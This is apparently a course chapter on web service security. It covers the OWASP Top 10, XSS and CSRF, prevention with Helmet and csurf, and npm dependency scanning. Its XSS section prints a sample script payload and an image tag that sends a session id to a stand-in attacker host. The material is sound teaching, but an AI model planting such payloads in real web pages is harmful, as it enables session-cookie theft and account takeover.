# Web Service Security

We are going to focus on security related topic in this section. The target is to get familiar with common vulnerabilities that may be exposed by web services and how to avoid them.

## OWASP Top 10 Vulnerabilities

The Open Web Application Security Project (OWASP) is a non-profit organization dedicated to providing unbiased, practical information about application security. The [OWASP Top 10 Web Application Security Risks](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project) was updated in 2017 to provide guidance to developers and security professionals on the most critical vulnerabilities that are commonly found in web applications, which are also easy to exploit. These 10 application risks are dangerous because they may allow attackers to plant malware, steal data, or completely take over your computers or web servers.

For those who are new to security issues, they may find it hard to interpret those issues. Luckily there is a project called [Damn Vulnerable NodeJS Application](https://appsecco.com/books/dvna-developers-security-guide/intro.html) which demonstrates some of the security issues. It actually demonstrates the top 10 issues identified in year 2013, which is a bit different from the list in 2017. Nevertheless, it's still a good tool to learn about those security issues. (Note: to play with this node application, you need to install [docker](https://www.docker.com/) on your computer.)

Another useful tool to demonstrate the security issues is [bWAPP, or a buggy web application](http://www.itsecgames.com/). It's written in PHP and it contains more than 100 vulnerabilities.

Out of those top 10 vulnerabilities, XSS and CSRF are very famous and worth more discussion.

### XSS (Cross Site Scripting)

Cross-site scripting, abbreviated to “XSS”, is a way attackers can take over webpages. The goal of an XSS attack is to gain control of JavaScript in the victim’s browser. Once a hacker has done that, there’s a lot of nasty stuff they can do: log your actions, impersonate you, steal your authentication cookies, and much more.

Here is an example of XSS Attack.

Assume you are filling in a form on some website. Let's say it's something innocuous like the quantity field on an order form or a comment on a comment form.

As a hacker, you can try to paste `<script>alert("haha")</script>` into the form in your system that will be viewable to someone else.

Now, what happens when the administrator views your latest orders? Basically, that javascript is now operating in the security context of the administrator. It could do something worse than alert()... for example, it could grab his session token or a cookie's secret value (depending on the cookie) and send it off to `<img src=evilattacker.xyz/clear.gif?sid=xxxx>`, and (assuming you control that `evilattacker.xyz` website) now you can get those session cookies or tokens and you can login to the system as the administrator.

This is just one way to launch XSS attack. There are many variants. You can find more examples and details from the references:

- [XSS Tutorial](https://hackertarget.com/xss-tutorial/)
- [Veracode: XSS](https://www.veracode.com/security/xss)
- [OWASP: Cross-site Scripting](https://www.owasp.org/index.php/Cross-site_Scripting_\(XSS\))
- [Cross-site scripting for dummies](https://hackernoon.com/cross-site-scripting-for-dummies-be30f76fad09)
- [XSS Explained](https://www.securesolutions.no/xss-explained/)

How can we prevent from this kind of attack?

OWASP provided a [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_\(Cross_Site_Scripting\)_Prevention_Cheat_Sheet)

Here are a few quick tips for developers:

- Make sure you always validate and escape the data submitted by the user, and do some sanitization on the user input data when you need to display them (i.e. display the user input data as pure text, instead of loading that as javascript code). For this purpose, you can use libraries like [xss-filter](https://github.com/yahoo/xss-filters) 

- Use tools like [helmet](https://helmetjs.github.io/docs/xss-filter/) to set `X-XSS-Protection` header in HTTP response, so that the browser can do some basic detection on XSS attack. 

- Another trick is to use [Http-Only Cookie](https://www.owasp.org/index.php/HttpOnly) so that session cookies cannot be accessed from Javascript.

- If you need to store some information into the storage space in browser, use `session storage` instead of `local storage` if you don't need that information after the browser tab is closed.

As a user, you can protect yourself by using some browser side security features. Chrome and Safari has a built-in feature called [XSS Auditor](https://www.virtuesecurity.com/blog/understanding-xss-auditor/) that tires to mitigate XSS attacks although it can’t catch all possible XSS variants.

### CSRF (Cross Site Request Forgery)

Cross-site request forgery also known as single-click attack or session traversing, in which a malicious website will throw a request to a web application that the user is already authenticated against from a different website. This way an attacker can access functionality in a targeted web application via the victim’s already authenticated browser.

Imagine the following case: A User is logged into GMail and checks his mails. After she stays logged in for a while - that's a regular behavior - the user opens a new Tab and navigates to another site. This site contains code that fires a regular HTTP Request to the GMail servers - an image tag is enough to do so. Since the user is still logged in, the request is processed with her privileges - maybe changes some settings or deletes some mails, thanks to the fact that HTTP is stateless - that's it. The attack has been performed successfully and neither the user nor GMail haven't even noticed.

[Here is another example](https://youtu.be/hW2ONyxAySY), watch the first 8 minutes of this video.

How can we prevent from this kind of attack?

One of the idea is called [CSRF Token](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_\(CSRF\)_Prevention_Cheat_Sheet#Synchronizer_.28CSRF.29_Tokens), which validate user requests with a unique token that can only come from the genuine user session.

For Express.js based applications, you can generate CSRF tokens with a middleware called [csurf](https://github.com/expressjs/csurf). 

As an end user, you can protect yourself against this attack using Firefox extension called [NoScript](https://noscript.net/) or Chrome plugin [uMatrix](https://github.com/gorhill/uMatrix) or [uBLock](https://github.com/gorhill/uBlock).

To get more details on CSRF attack, here are a few more articles:

- [Understanding CSRF](https://github.com/pillarjs/understanding-csrf)
- [Understanding the CSRF Vulnerability (A Beginner Guide)](http://www.hackingarticles.in/understanding-csrf-vulnerability-beginner-guide/)
- [CSRF DEMYSTIFIED](http://www.gnucitizen.org/blog/csrf-demystified/)
- [Wikipedia entry on CSRF](https://en.wikipedia.org/wiki/Cross-site_request_forgery)

## Follow Secure Coding Practices

As a developer, you need to be aware of the common security concerns and follow best practices when you write code. 

Here are some of the guidelines:

- [Mozilla Secure Coding Guidelines](https://wiki.mozilla.org/WebAppSec/Secure_Coding_Guidelines)
- [OWASP Secure Coding Cheat Sheet](https://www.owasp.org/index.php/Secure_Coding_Cheat_Sheet)
- [JavaScript Web Application Secure Coding Practices](https://checkmarx.gitbooks.io/js-scp/)

You can also make use tools that automatically scan your code for potential security issues:

- [ESLint Plugin To Detect Possible Security Issues in Codes](https://www.npmjs.com/package/eslint-plugin-security)

## Make sure your NPM dependencies are secure

When you develop Javascript based applications, you would have a lot of dependencies on 3rd party modules. How can you be confident that those dependencies do not have known vulnerabilities? Remember, using components with known vulnerabilities" is a part of the OWASP Top 10 and insecure libraries can pose a huge risk for your web app.

What are the vulnerabilities are we talking about? You can get some examples [here](https://snyk.io/vuln?packageManager=npm)

The tools below can scan the libraries you use and detect those with vulnerabilities

- [Snyk](https://snyk.io/)
- [Node Security Platform (a.k.a NSP)](https://nodesecurity.io/)
- [Retire.js](https://retirejs.github.io/retire.js/)

You should regularly review your dependencies. Avoid the unnecessary ones and make the rest up-to-date. To ensure your dependencies are up-to-date, you can use tools like [greenkeeper](https://greenkeeper.io/)

Here are a few articles to give you more tips on how to manage the risks from 3rd party libraries:

- [Controlling the Node.js security risk of npm dependencies](https://blog.risingstack.com/controlling-node-js-security-risk-npm-dependencies/) is a good article talking about the process to reduce the security risks from 3rd party dependencies.

- [Quick Introduction on GreenKeeper/Snyk/NSP/Retire.js](https://developers.redhat.com/blog/2017/04/12/using-snyk-nsp-and-retire-js-to-identify-and-fix-vulnerable-dependencies-in-your-node-js-applications/)

- [Eliminating Known Vulnerabilities With Snyk]( https://www.smashingmagazine.com/2016/01/eliminating-known-security-vulnerabilities-with-snyk/)

## Labs

### Learn how to use Helmet

Follow this tutorial to learn about how to use Helmet:
<https://www.twilio.com/blog/2017/11/securing-your-express-app.html>

### Learn how to use csurf to prevent CSRF attack

Follow this tutorial to learn about how to use csurf:
<https://www.twilio.com/blog/2017/11/securing-your-express-app.html>

### Try to Fix OWASP Top 10 Vulnerabilities

Follow the guide to learn the TOP10 OWASP vulnerabilities

- https://github.com/OWASP/NodeGoat
- https://appsecco.com/books/dvna-developers-security-guide/intro.html

## Resources

### More Labs

- [HacksExplaining](https://www.hacksplaining.com/lessons)

### Recommended Readings

- [Node JS Security Tips](https://blog.risingstack.com/node-js-security-tips/)
- [Express Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)
- [9 Security Practice to Keep Express from Getting Pwned](https://nodesource.com/blog/nine-security-tips-to-keep-express-from-getting-pwned/)
- [Secure Express App with various HTTP headers](https://github.com/helmetjs/helmet)
- [Writing Secure Express.js Apps](https://blog.liftsecurity.io/2012/12/07/writing-secure-express-js-apps)
- [Building Secure Javascript Apps](https://nemethgergely.com/building-secure-javascript-applications/)
- [Simple Steps to Secure Your Express Node Application](http://scottksmith.com/blog/2014/09/04/simple-steps-to-secure-your-express-node-application/)
